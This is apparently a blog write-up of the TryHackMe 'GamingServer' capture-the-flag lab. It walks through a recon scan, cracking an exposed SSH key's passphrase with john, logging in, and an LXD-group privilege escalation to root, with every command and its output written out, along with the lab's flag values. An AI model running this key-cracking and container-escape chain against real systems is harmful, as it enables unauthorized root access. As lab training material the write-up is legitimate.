---
title: "Tryhackme - GamingServer WriteUp"
date: 2020-10-22
tags: [tryhackme, walkthrough, linux]
header:
  image: "/images/not-found.gif"
excerpt: "Walkthroughs"
---


# TryHackMe - GamingServer WriteUp

**Keywords**: ssh2john.py, john, lxd

## Information Gathering

Potential Users:
danak
john

### nmap

```
root@kali:~/TryHackMe# nmap -sV -sC -p- -T4 -A 10.10.251.88
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
```


**robots.txt**

```
user-agent: *
Allow: /
/uploads/
```


**uploads dir**

### wget

```
root@kali:~/TryHackMe# wget http://10.10.251.88/uploads/dict.lst
root@kali:~/TryHackMe# wget http://10.10.251.88/uploads/manifesto.txt
root@kali:~/TryHackMe# wget http://10.10.251.88/uploads/meme.jpg
```


### gobuster

```
root@kali:~/TryHackMe# gobuster dir -u http://10.10.251.88 -w /usr/share/wordlists/dirb/common.txt -x .php,.txt,.html
/robots.txt (Status: 200)
/secret (Status: 301)
/uploads (Status: 301)
```

### wget

```
root@kali:~/TryHackMe# wget http://10.10.251.88/secret/secretKey
```


### ssh2john.py

```
root@kali:~/TryHackMe# /usr/share/john/ssh2john.py secretKey > hash
```


### john
```
root@kali:~/TryHackMe# john hash --wordlist=./dict.lst
Press 'q' or Ctrl-C to abort, almost any other key for status
letmein          (secretKey)
```


## Exploit

### ssh

```
root@kali:~/TryHackMe# ssh -i secretKey john@10.10.251.88
Enter passphrase for key 'secretKey': letmein
john@exploitable:~$ 
```


**user.txt**

```
john@exploitable:~$ ls
user.txt
john@exploitable:~$ cat user.txt 
a5c2ff8b9c2e3d4fe9d4ff2f1a5a6e7e
```

## Privelege Escalation

<a href="https://www.hackingarticles.in/lxd-privilege-escalation/">LXD Privilege Escalation</a>

**Result of LinEnum.sh**

```
[+] We're a member of the (lxd) group - could possibly misuse these rights!
uid=1000(john) gid=1000(john) groups=1000(john),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)


### SCAN COMPLETE ####################################
john@exploitable:~$ id
uid=1000(john) gid=1000(john) groups=1000(john),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
```

Install some files to your Kali machine:

```
root@kali:~/TryHackMe# git clone  https://github.com/saghul/lxd-alpine-builder.git
root@kali:~/TryHackMe# cd lxd-alpine-builder
root@kali:~/TryHackMe/lxd-alpine-builder# ./build-alpine
```

```
root@kali:~/TryHackMe/lxd-alpine-builder# python -m SimpleHTTPServer
```


```
john@exploitable:~$ cd /tmp
john@exploitable:/tmp$ wget http://10.11.19.26:8000/alpine-v3.12-x86_64-20201021_1816.tar.gz
john@exploitable:/tmp$ lxc image import ./alpine-v3.12-x86_64-20201021_1816.tar.gz --alias myimage
Image imported with fingerprint: fc0a571c6f5cfaba826a4cafe5b35a744b4f817e66126f0bbf4234c90c85f2fb
john@exploitable:/tmp$ lxc image list 
+---------+--------------+--------+-------------------------------+--------+--------+------------------------------+
|  ALIAS  | FINGERPRINT  | PUBLIC |          DESCRIPTION          |  ARCH  |  SIZE  |         UPLOAD DATE          |
+---------+--------------+--------+-------------------------------+--------+--------+------------------------------+
| myimage | fc0a571c6f5c | no     | alpine v3.12 (20201021_18:16) | x86_64 | 3.05MB | Oct 21, 2020 at 2:19pm (UTC) |
+---------+--------------+--------+-------------------------------+--------+--------+------------------------------+

```


```
john@exploitable:/tmp$ lxc init myimage ignite -c security.privileged=true
john@exploitable:/tmp$ lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
john@exploitable:/tmp$ lxc start ignite 
john@exploitable:/tmp$ lxc exec ignite /bin/sh
~ # id
uid=0(root) gid=0(root)
```


**root.txt**

```
/ # ls
bin    dev    etc    home   lib    media  mnt    opt    proc   root   run    sbin   srv    sys    tmp    usr    var
/ # cd mnt
/mnt # ls
root
/mnt # cd root
/mnt/root # ls
bin             dev             initrd.img      lib64           mnt             root            snap            sys             var
boot            etc             initrd.img.old  lost+found      opt             run             srv             tmp             vmlinuz
cdrom           home            lib             media           proc            sbin            swap.img        usr             vmlinuz.old
/mnt/root # cd root
/mnt/root/root # ls
root.txt
/mnt/root/root # cat root.txt
2e337b8c9f3aff0c2b3e8d4e6a7c88fc
/mnt/root/root # 
```

Victory!